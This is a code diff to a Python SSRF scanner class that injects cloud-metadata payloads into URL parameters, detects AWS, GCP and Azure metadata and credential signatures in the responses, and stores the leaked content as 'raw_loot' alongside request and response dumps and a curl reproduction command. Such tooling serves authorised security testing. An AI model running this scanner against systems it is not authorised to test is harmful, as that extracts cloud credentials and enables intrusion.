@@ -27,36 +27,32 @@ class SSRFScanner:
     def _test_url(self, base_url, param, payload, logger=None):
         """Helper to test a single parameter with a payload."""
         try:
-            # We don't want to use requests here for the final check because we want to see 
-            # if the target acts as a proxy.
             test_url = f"{base_url}{'&' if '?' in base_url else '?'}{param}={payload}"
+            # Use sessions for consistency
             r = http_client.get(test_url, options=getattr(self, "options", None), timeout=5, allow_redirects=True)
             
             # Guard: only match on 200 with text content (avoids WAF/redirect false positives)
             if r.status_code != 200:
-                return False, None, None
+                return False, None, None, None
             ctype = r.headers.get("Content-Type", "")
             if "text" not in ctype and "json" not in ctype:
-                return False, None, None
+                return False, None, None, None
 
             # Signatures for success
             signatures = [
                 "ami-id", "instance-id", "local-hostname",  # AWS
                 "AccessKeyId", "SecretAccessKey",           # AWS IAM
-                "computeMetadata/v1", "access_token",      # GCP
+                "computeMetadata/v1", "access_token",       # GCP
                 "compute", "network", "storage"             # Azure/Generic
             ]
             
             if any(sig in r.text for sig in signatures):
-                return True, r.text, test_url
+                return True, r, test_url, payload
         except Exception:
             pass
-        return False, None, None
+        return False, None, None, None
 
     def scan_endpoints(self, discovered_urls, logger=None):
-        """
-        Analyzes discovered URLs for SSRF vulnerabilities targeting Cloud Metadata.
-        """
         findings = []
         if not discovered_urls:
             return findings
@@ -88,25 +84,35 @@ class SSRFScanner:
 
             for param in params_to_test:
                 for cloud, payload in self.metadata_payloads.items():
-                    # Extra headers for Azure/GCP if needed (though SSRF usually just sends GET)
-                    hit, content, vuln_url = self._test_url(base, param, payload, logger)
+                    hit, resp, vuln_url, p_val = self._test_url(base, param, payload, logger)
                     
                     if hit:
                         severity = "critical"
                         title = f"CRITICAL: SSRF Cloud Metadata Leak ({cloud.upper()})"
                         desc = f"Vulnerable Endpoint: `{vuln_url}`\n\nIdentified a Server-Side Request Forgery vulnerability that allows access to internal Cloud Metadata Services. "
                         
-                        if "SecretAccessKey" in content or "access_token" in content:
+                        if "SecretAccessKey" in resp.text or "access_token" in resp.text:
                             title = f"💣 EXPLOITABLE: SSRF {cloud.upper()} Credentials Leaked"
                             desc += "\n\n**CRITICAL**: Temporary security credentials (tokens/keys) were extracted from the metadata service."
-                            
+
+                        # Build evidence
+                        req_dump = f"GET {vuln_url} HTTP/1.1\nHost: {self.target}\n"
+                        res_dump = f"HTTP/1.1 {resp.status_code} {resp.reason}\n"
+                        for k, v in resp.headers.items():
+                            res_dump += f"{k}: {v}\n"
+                        res_dump += f"\n{resp.text[:1000]}..."
+
                         findings.append({
                             "title": title,
-                            "description": desc + f"\n\nEvidence Snippet:\n```\n{content[:500]}\n```",
+                            "description": desc,
                             "severity": severity,
                             "tool_source": "ssrf_expert",
-                            "raw_loot": content[:2000],
-                            "loot_type": "Cloud Credentials" if "AccessKeyId" in content else "Instance Metadata"
+                            "url": vuln_url,
+                            "request": req_dump,
+                            "response": res_dump,
+                            "repro_command": f"curl -v '{vuln_url}'",
+                            "raw_loot": resp.text[:2000],
+                            "loot_type": "Cloud Credentials" if "AccessKeyId" in resp.text else "Instance Metadata"
                         })
                         
                         if logger: logger(f"🔥 SSRF BREACH: {cloud.upper()} metadata exposed on {base}", "CRITICAL")
